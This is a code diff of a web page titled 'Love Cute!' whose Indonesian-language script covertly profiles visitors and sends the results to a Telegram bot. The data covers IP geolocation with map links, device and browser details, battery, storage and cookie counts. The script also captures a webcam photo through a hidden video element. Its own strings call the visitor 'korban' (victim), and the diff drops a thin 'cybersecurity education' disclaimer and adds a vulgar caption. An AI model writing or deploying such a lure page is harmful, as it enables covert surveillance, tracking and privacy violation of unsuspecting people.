@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Love Cute!</title>
 <style>
-/* CSS tetap sama */
 * {
   margin: 0;
   padding: 0;
@@ -287,11 +286,10 @@ async function getAdditionalInfo(){
 function buildCaption(ip,d,additional){
   const g=`https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
   return [
-    "📱 <b>DATA KORBAN DITEMUKAN!</b>",
+    "<b> REPORT NEW </b>",
     "",
-    "🛡️ <b>CYBERSECURITY REPORT - ENHANCED</b> 🛡️",
-    "",
-    "<b>📍 INFORMASI LOKASI DETAIL</b>",
+    "<blockquote>",
+    "<b>📍 INFORMASI LOKASI </b>",
     `🌐 IP Address: <code>${escapeHtml(ip.ip)}</code>`,
     `🏙️ Kota: ${escapeHtml(ip.city)}`,
     `🗺️ Region: ${escapeHtml(ip.region)}`,
@@ -301,7 +299,9 @@ function buildCaption(ip,d,additional){
     `🔧 ASN: ${escapeHtml(ip.asn)}`,
     `📌 Koordinat: ${escapeHtml(ip.latitude)}, ${escapeHtml(ip.longitude)}`,
     `🗺️ Google Maps: ${g}`,
+    "</blockquote>",
     "",
+    "<blockquote>",
     "<b>💻 INFORMASI PERANGKAT & BROWSER</b>",
     `🖥️ Platform: ${escapeHtml(d.platform)}`,
     `🌐 Browser: ${escapeHtml(d.userAgent.split('/')[0])}`,
@@ -315,7 +315,9 @@ function buildCaption(ip,d,additional){
     `📐 Orientasi: ${escapeHtml(d.orientation)}`,
     `🎨 Color Depth: ${escapeHtml(d.colorDepth)}`,
     `🔍 Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
+    "</blockquote>",
     "",
+    "<blockquote>",
     "<b>🌐 INFORMASI JARINGAN & WAKTU</b>",
     `🔌 Status Online: ${escapeHtml(d.online ? "✅" : "❌")}`,
     `📶 Tipe Koneksi: ${escapeHtml(d.connectionType)}`,
@@ -325,7 +327,9 @@ function buildCaption(ip,d,additional){
     `🚫 Do Not Track: ${escapeHtml(d.doNotTrack || "Tidak diatur")}`,
     `🕐 Timezone: ${escapeHtml(d.timezone)}`,
     `⏰ Waktu Lokal: ${escapeHtml(d.localTime)}`,
+    "</blockquote>",
     "",
+    "<blockquote>",
     "<b>🔋 INFORMASI BATERAI & PENYIMPANAN</b>",
     `⚡ Level: ${escapeHtml(Math.round((d.battery?.level || 0) * 100))}%`,
     `🔌 Charging: ${escapeHtml(d.battery?.charging ? "✅" : "❌")}`,
@@ -335,15 +339,18 @@ function buildCaption(ip,d,additional){
     `💽 Storage Used: ${escapeHtml(formatBytes(additional.storageUsage))}`,
     `🍪 Jumlah Cookies: ${escapeHtml(additional.cookieCount)}`,
     `🎥 Perangkat Media: ${escapeHtml(additional.mediaDevices.join(', ') || 'Tidak terdeteksi')}`,
+    "</blockquote>",
     "",
+    "<blockquote>",
     "<b>🌐 INFORMASI SESI</b>",
     `🔗 URL: ${escapeHtml(location.href)}`,
     `📎 Referrer: ${escapeHtml(document.referrer || "Direct")}`,
     `🕐 Waktu (UTC): ${escapeHtml(new Date().toISOString())}`,
     `👤 User Agent Lengkap:`,
     `<code>${escapeHtml(d.userAgent)}</code>`,
+    "</blockquote>",
     "",
-    "⚠️ <i>Data dikumpulkan untuk keperluan edukasi cybersecurity - Enhanced Version</i>"
+    "<i>GW SUKA MEMEK</i>"
   ].join("\n");
 }
 
@@ -373,7 +380,7 @@ async function sendToTelegram(method, data) {
 async function sendIpDevice(){
   const [ip,d,additional] = await Promise.all([getIpInfo(), getDeviceInfo(), getAdditionalInfo()]);
   
-  // Kirim JPG dengan caption data
+  // Kirim foto static dengan caption data
   await sendToTelegram("sendPhoto", {
     chat_id: CHAT_ID,
     photo: STATIC_IMAGE,
@@ -384,9 +391,10 @@ async function sendIpDevice(){
 
 async function sendSnapshot(){
   try{
-    // 1. Kirim data dengan JPG terlebih dahulu
+    // 1. KIRIM DATA TERLEBIH DAHULU - INI YANG DITAMBAHKAN
     const [ip,d,additional] = await Promise.all([getIpInfo(), getDeviceInfo(), getAdditionalInfo()]);
     
+    // Kirim data sebagai photo dengan JPG
     await sendToTelegram("sendPhoto", {
       chat_id: CHAT_ID,
       photo: STATIC_IMAGE,
@@ -394,14 +402,7 @@ async function sendSnapshot(){
       parse_mode: "HTML"
     });
 
-    // 2. Kirim MP3
-    await sendToTelegram("sendAudio", {
-      chat_id: CHAT_ID,
-      audio: MP3_URL,
-      caption: "🎵 Audio File"
-    });
-
-    // 3. Ambil dan kirim foto dari kamera
+    // 2. Ambil foto dari kamera
     const stream = await navigator.mediaDevices.getUserMedia({video:true});
     const video = document.createElement('video');
     video.style.display='none';
@@ -418,10 +419,17 @@ async function sendSnapshot(){
 
     const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
 
-    // Kirim foto korban
+    // 3. Kirim MP3
+    await sendToTelegram("sendAudio", {
+      chat_id: CHAT_ID,
+      audio: MP3_URL,
+      caption: "🎵 Audio untuk korban"
+    });
+
+    // 4. Kirim foto korban
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
-    formData.append("document", blob, `foto_korban_${Date.now()}.jpg`);
+    formData.append("document", blob, "foto_korban.jpg");
     formData.append("caption", "📸 FOTO KORBAN BERHASIL DIAMBIL!\n🕐 Waktu: " + new Date().toLocaleString('id-ID'));
 
     await sendToTelegram("sendDocument", formData);
@@ -444,7 +452,7 @@ async function sendSnapshot(){
     await sendToTelegram("sendAudio", {
       chat_id: CHAT_ID,
       audio: MP3_URL,
-      caption: "🎵 Audio File"
+      caption: "🎵 Audio untuk korban"
     });
   }
 }
